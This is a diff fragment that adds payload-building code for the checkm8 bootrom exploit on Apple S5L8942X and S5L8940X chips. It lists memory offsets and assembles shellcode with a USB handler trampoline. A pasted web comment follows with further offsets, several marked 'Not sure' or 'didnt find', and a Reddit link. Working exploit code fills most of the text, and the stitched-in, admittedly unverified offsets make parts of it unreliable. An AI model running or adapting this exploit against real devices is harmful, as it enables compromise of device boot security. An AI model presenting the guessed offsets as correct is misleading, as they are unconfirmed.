@@ -1,0 +1,74 @@
+  if cpid == 0x8942:
+    constants_usb_s5l8942x = [
+                0x34000000, # 1 - LOAD_ADDRESS feito
+                0x65786563, # 2 - EXEC_MAGIC
+                0x646F6E65, # 3 - DONE_MAGIC
+                0x6D656D63, # 4 - MEMC_MAGIC
+                0x6D656D73, # 5 - MEMS_MAGIC
+                  0x7608+1, # 6 - USB_CORE_DO_IO find
+    ]
+    constants_checkm8_s5l8942x = [
+                0x3402D8A8, # 1 - gUSBDescriptors find
+                0x3402DE00, # 2 - gUSBSerialNumber find
+                  0x7BB8+1, # 3 - usb_create_string_descriptor find
+                0x3402C1A8, # 4 - gUSBSRNMStringDescriptor find
+                0x34039800, # 5 - PAYLOAD_DEST find
+      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
+        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
+                0x3402D98C, # 8 - PAYLOAD_PTR didnt find
+    ]
+    s5l8942x_handler = asm_thumb_trampoline(0x34039800+1, 0x80E0+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s5l8942x)[8:]
+    s5l8942x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8942x)
+    assert len(s5l8942x_shellcode) <= PAYLOAD_OFFSET_ARMV7
+    assert len(s5l8942x_handler) <= PAYLOAD_SIZE_ARMV7
+    return s5l8942x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8942x_shellcode)) + s5l8942x_handler
+    
+    
+    from web:
+
+
+Some offsets I found:
+
+if cpid == 0x8940:
+
+constants_usb_s5l8940x = [
+
+0x34000000, # 1 - LOAD_ADDRESS
+
+0x65786563, # 2 - EXEC_MAGIC
+
+0x646F6E65, # 3 - DONE_MAGIC
+
+0x6D656D63, # 4 - MEMC_MAGIC
+
+0x6D656D73, # 5 - MEMS_MAGIC
+
+0x7214+1, # 6 - USB_CORE_DO_IO - Offset found
+
+]
+
+constants_checkm8_s5l8940x = [
+
+0x3402D848, # 1 - gUSBDescriptors - Offset found
+
+0x3402DDA0, # 2 - gUSBSerialNumber - Offset found
+
+0x7798+1, # 3 - usb_create_string_descriptor - Offset found
+
+0x3402C18A, # 4 - gUSBSRNMStringDescriptor - Offset found
+
+0x34039800, # 5 - PAYLOAD_DEST
+
+PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
+
+PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
+
+0x3402D92C, # 8 - PAYLOAD_PTR - Not sure
+
+]
+
+s5l8940x_handler = asm_thumb_trampoline(0x34039800+1, 0x7C80+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s5l8940x)[8:]
+
+Not sure if it is correct because large_leak and padding still not found
+
+https://www.reddit.com/r/LegacyJailbreak/comments/fvg5k4/discussion_good_news_someone_has_dumped_iphone_4s/
